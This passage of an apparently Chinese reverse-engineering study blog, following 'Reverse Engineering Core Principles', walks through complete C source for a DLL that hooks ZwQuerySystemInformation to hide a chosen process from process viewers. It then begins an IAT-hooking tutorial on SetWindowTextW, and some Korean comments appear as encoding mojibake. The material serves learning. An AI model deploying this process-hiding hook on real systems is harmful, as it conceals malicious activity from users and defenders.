pFunc;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// API ÁÖ¼Ò ±¸ÇÑ´Ù</span></span><br><span class="line">    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);</span><br><span class="line">    pByte = (PBYTE)pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ¸¸¾à ÀÌ¹Ì ¾ðÈÄÅ· µÇ¾î ÀÖ´Ù¸é return FALSE</span></span><br><span class="line">    <span class="keyword">if</span>( pByte[<span class="number">0</span>] != <span class="number">0xE9</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ¿ø·¡ ÄÚµå(5 byte)¸¦ µ¤¾î¾²±â À§ÇØ ¸Þ¸ð¸®¿¡ WRITE ¼Ó¼º Ãß°¡</span></span><br><span class="line">    VirtualProtect((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unhook</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pFunc, pOrgBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ¸Þ¸ð¸® ¼Ó¼º º¹¿ø</span></span><br><span class="line">    VirtualProtect((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS WINAPI <span class="title function_">NewZwQuerySystemInformation</span><span class="params">(</span></span><br><span class="line"><span class="params">                SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span><br><span class="line"><span class="params">                PVOID SystemInformation, </span></span><br><span class="line"><span class="params">                ULONG SystemInformationLength, </span></span><br><span class="line"><span class="params">                PULONG ReturnLength)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS status;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;</span><br><span class="line">    <span class="type">char</span> szProcName[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ÀÛ¾÷ Àü¿¡ unhook</span></span><br><span class="line">    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// original API È£Ãâ</span></span><br><span class="line">    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), </span><br><span class="line">                           DEF_ZWQUERYSYSTEMINFORMATION);</span><br><span class="line">    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)</span><br><span class="line">              (SystemInformationClass, SystemInformation, </span><br><span class="line">              SystemInformationLength, ReturnLength);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( status != STATUS_SUCCESS )</span><br><span class="line">        <span class="keyword">goto</span> __NTQUERYSYSTEMINFORMATION_END;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SystemProcessInformation ÀÎ °æ¿ì¸¸ ÀÛ¾÷ÇÔ</span></span><br><span class="line">    <span class="keyword">if</span>( SystemInformationClass == SystemProcessInformation )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// SYSTEM_PROCESS_INFORMATION Å¸ÀÔ Ä³½ºÆÃ</span></span><br><span class="line">        <span class="comment">// pCur ´Â single linked list ÀÇ head</span></span><br><span class="line">        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ÇÁ·Î¼¼½º ÀÌ¸§ ºñ±³</span></span><br><span class="line">            <span class="comment">// g_szProcName = ÀºÆóÇÏ·Á´Â ÇÁ·Î¼¼½º ÀÌ¸§</span></span><br><span class="line">            <span class="comment">// (=&gt; SetProcName() ¿¡¼­ ¼¼ÆÃµÊ)</span></span><br><span class="line">            <span class="keyword">if</span>(pCur-&gt;Reserved2[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[<span class="number">1</span>], g_szProcName))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// ¿¬°á ¸®½ºÆ®¿¡¼­ ÀºÆó ÇÁ·Î¼¼½º Á¦°Å</span></span><br><span class="line">                    <span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">                        pPrev-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pPrev = pCur;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ¿¬°á ¸®½ºÆ®ÀÇ ´ÙÀ½ Ç×¸ñ</span></span><br><span class="line">            pCur = (PSYSTEM_PROCESS_INFORMATION)</span><br><span class="line">                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">__NTQUERYSYSTEMINFORMATION_END:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ÇÔ¼ö Á¾·á Àü¿¡ ´Ù½Ã API Hooking</span></span><br><span class="line">    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, </span><br><span class="line">                 (PROC)NewZwQuerySystemInformation, g_pOrgBytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">char</span>            *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 异常处理</span></span><br><span class="line">    <span class="comment">// 若当前进程为 HookProc.exe 则终止，不进行钩取。</span></span><br><span class="line">    GetModuleFileNameA(<span class="literal">NULL</span>, szCurProc, MAX_PATH);</span><br><span class="line">    p = <span class="built_in">strrchr</span>(szCurProc, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>( (p != <span class="literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="number">1</span>, <span class="string">&quot;HideProc.exe&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// #2. API Hooking</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, </span><br><span class="line">                     (PROC)NewZwQuerySystemInformation, g_pOrgBytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// #3. API Unhooking </span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, </span><br><span class="line">                       g_pOrgBytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">SetProcName</span><span class="params">(LPCTSTR szProcName)</span></span><br><span class="line">&#123;</span><br><span class="line">    _tcscpy_s(g_szProcName, szProcName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>接下来逐部分对stealth.dll的源码进行分析。通过HideProc所做的工作，可完成对目标进程注入该DLL</p><h5 id="DllMain"><a href="#DllMain" class="headerlink" title="DllMain"></a>DllMain</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">char</span>            *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 异常处理</span></span><br><span class="line">    <span class="comment">// 若当前进程为 HookProc.exe 则终止，不进行钩取。</span></span><br><span class="line">    GetModuleFileNameA(<span class="literal">NULL</span>, szCurProc, MAX_PATH);</span><br><span class="line">    p = <span class="built_in">strrchr</span>(szCurProc, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>( (p != <span class="literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="number">1</span>, <span class="string">&quot;HideProc.exe&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// #2. API Hooking</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, </span><br><span class="line">                     (PROC)NewZwQuerySystemInformation, g_pOrgBytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// #3. API Unhooking </span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, </span><br><span class="line">                       g_pOrgBytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分情况调用</p><ul><li><code>hook_by_code</code>传入待钩取API所在的模块名称，待钩取的API，钩取函数地址，用于保存原来字节码内容的位置。</li><li><code>unhook_by_code</code>传入待恢复的API所在的模块名称，待恢复的API，保存原来字节码内容的位置。</li></ul><h5 id="hook-by-code"><a href="#hook-by-code" class="headerlink" title="hook_by_code"></a>hook_by_code</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">hook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    FARPROC pfnOrg;</span><br><span class="line">    DWORD dwOldProtect, dwAddress;</span><br><span class="line">    BYTE pBuf[<span class="number">5</span>] = &#123;<span class="number">0xE9</span>, <span class="number">0</span>, &#125;;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line"></span><br><span class="line">    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);</span><br><span class="line">    pByte = (PBYTE)pfnOrg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pByte[<span class="number">0</span>] == <span class="number">0xE9</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    VirtualProtect((LPVOID)pfnOrg, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">memcpy</span>(pOrgBytes, pfnOrg, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(pfnOrg, pBuf, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    VirtualProtect((LPVOID)pfnOrg, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第8-9行，指出需要钩取的API地址，将API地址转化为字节指针，方便后续读取出字节内容。</li><li>第11-12行，比对API地址的第一个字节内容，判断是否被钩取过（E9代表JMP）</li><li>第14-15行，修改API所在内存的内存保护权限，因为需要修改字节内容以及执行需要有<code>PAGE_EXECUTE_READWRITE</code>，并保存旧的权限，方便后面回复。（可能PE装载器会验证）</li><li>第17-18行，可以说是最关键的内容了。完成对JMP目标地址的计算，计算结果是相对地址，这是JMP指令的操作数决定的。具体计算方法：<code>XXXXXXXX = 跳转目标地址 - 当前指令地址 - 当前指令长度（5）</code></li><li>第20-22行，覆盖原API的前5字节，恢复相关内存的旧权限，完成HOOK</li></ul><p>至于<code>unhook_by_code</code>部分，相信经过上述的部分的分析，读者也能尝试自己阅读这部分源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">unhook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// API地址</span></span><br><span class="line">    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);</span><br><span class="line">    pByte = (PBYTE)pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前是否被hook了</span></span><br><span class="line">    <span class="keyword">if</span>( pByte[<span class="number">0</span>] != <span class="number">0xE9</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内存保护权限相关</span></span><br><span class="line">    VirtualProtect((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unhook</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pFunc, pOrgBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复</span></span><br><span class="line">    VirtualProtect((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上便是对于隐藏进程Rookie技术的实施过程。但依旧存在以下问题：</p><ul><li>需要进行DLL注入完成钩取的进程个数：由于进程查看器这类的软件由很多，上述的方案中，需要将DLL注入进程查看器对应的进程。若只是注入一个进程查看器进程，则再次开启另一进程查看器进行查看，依旧会使得我们想隐藏的进程被观察到。即对于后续即将启用的新的进程查看器的进程依旧看得到我们想隐藏的目标。</li></ul><p>结局方案：全局Hook。若设置的钩子是全局的，使得当前系统中无论是否是在下完钩子后的进程调用被Hook的API，依旧会做同样的钩子函数的流程。这部分，我们下节讨论！</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.14--SetWindowsText_Hook</title>
      <link href="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/"/>
      <url>/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/</url>
      
        <content type="html"><![CDATA[<p>上节内容是使用的调试器Hook，通过修改目标代码第一个字节为<code>0xCC</code>来设置调试事件，随后当相关API被调用，由于此时第一个字节被设置为<code>断点异常调试事件</code>，可以被调试器捕获到，此时获取程序执行上下文的<code>CONTEXT结构</code>可以获取到对应API的参数地址，做相应的修改后，恢复API第一个字节，之后在正常调用，由于参数被修改了，借此达到Hook的目的。</p><p>本节采取的是另外一种方法，<code>Hook IAT</code>中的函数。</p><p>展示书中Hook的实例，钩取的目标API是<code>user32.SetWindowTextW</code>，函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetWindowTextW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           HWND    hWnd,<span class="comment">//窗口句柄</span></span></span><br><span class="line"><span class="params">  [in, optional] LPCWSTR lpString<span class="comment">//显示内容所在地址</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>钩取后修改第二个参数内容，可以达到修改Windows窗口即将显示的内容，比如修改计算器的显示字符为中文：(由于计算器可能因OS版本存在差异，这里笔者使用的为书的作者的计算器)</p><img src="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/1.png" class=""><hr><h3 id="PE格式回顾"><a href="#PE格式回顾" class="headerlink" title="PE格式回顾"></a>PE格式回顾</h3><p>明确本节的内容目的在于Hook IAT中的API，需要从程序中读取IAT中的目标API。</p><img src="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/2.png" class=""><p>这里回顾下PE文件格式的内容，建议读者和我一样，尽可能按照手动查找的方式，不过于依赖工具，假以时日PE格式解读会更上一层路。话不多说，我们开始。</p><p>在HxD下，找到相关字段：</p><img src="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/3.png" class=""><p>读取出IAT的位置为<code>0x00012B80（RVA）</code>，查看区段表，发现该地址位于节区<code>.text</code></p><img src="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/4.png" class=""><p>节区<code>.text</code>的节区头信息如下：</p><img src="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/5.png" class=""><p>地址转换，<code>RVA -&gt; RAW : 0x00012B80 - 0x00001000 + 0x00000400 = 0x00011F80</code>，文件中跟随该地址：</p><img src="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/6.png" class=""><p>以0x14 byte为单位进行读取（这是由于IAT表项指向单元为<code>IMAGE_IMPORT_DESCRIPTOR</code>，大小占0x14 bytes），上图已经划分好，可以看到，calc.exe载入6个DLL文件，最后一个是结束标志，以全0结构体<code>IMAGE_IMPORT_DESCRIPTOR</code>为标识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            </span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound INT </span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;                           <span class="comment">//name</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT </span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>一次查看，发现了我们的目标函数<code>SetWindowsText</code>所在的DLL文件—<code>user32.dll</code>，对应倒数第二个结构项。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B0 2C 01 00 FF FF FF FF FF FF FF FF A4 36 01 00 A4 10 00 00</span><br></pre></td></tr></table></figure><p>对应的存放着IAT地址为<code>RVA = 0x00012CB0 -&gt; RAW = 0x00120B0</code>，[0x00120B0]是IAT的地址 &#x3D; 0x0001335C -&gt; 0x0001275C</p><img src="/2022/05/09/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-14-SetWindowsText-Hook/7.png" class=""><p>查看到了目标API是存在与IAT中的。于是开始下边的实验部分。</p><h3 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h3><p>从源码入手分析，该Hook方法的实施细节，这里贴一下完整代码(DLL)，需要配合先前的DLL注入器使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;wchar.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span> <span class="params">(WINAPI *PFSETWINDOWTEXTW)</span><span class="params">(HWND hWnd, LPWSTR lpString)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// globals</span></span><br><span class="line">FARPROC g_pOrgFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// »ç¿ëÀÚ ÈÄÅ· ÇÔ¼ö</span></span><br><span class="line">BOOL WINAPI <span class="title function_">MySetWindowTextW</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">wchar_t</span>* pNum = <span class="string">L&quot;¿µÀÏÀÌ»ï»ç¿ÀÀ°Ä¥ÆÈ±¸&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> temp[<span class="number">2</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, nLen = <span class="number">0</span>, nIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nLen = wcslen(lpString);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// &#x27;¼ö&#x27;¹®ÀÚ¸¦ &#x27;ÇÑ±Û&#x27;¹®ÀÚ·Î º¯È¯</span></span><br><span class="line">        <span class="comment">//   lpString Àº wide-character (2 byte) ¹®ÀÚ¿­</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="string">L&#x27;9&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            temp[<span class="number">0</span>] = lpString[i];</span><br><span class="line">            nIndex = _wtoi(temp);</span><br><span class="line">            lpString[i] = pNum[nIndex];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// user32!SetWindowTextW() API È£Ãâ</span></span><br><span class="line">    <span class="comment">//   (À§¿¡¼­ lpString ¹öÆÛ ³»¿ëÀ» º¯°æÇÏ¿´À½)</span></span><br><span class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// hook_iat</span></span><br><span class="line"><span class="comment">//   ÇöÀç ÇÁ·Î¼¼½ºÀÇ IAT ¸¦ °Ë»öÇØ¼­</span></span><br><span class="line"><span class="comment">//   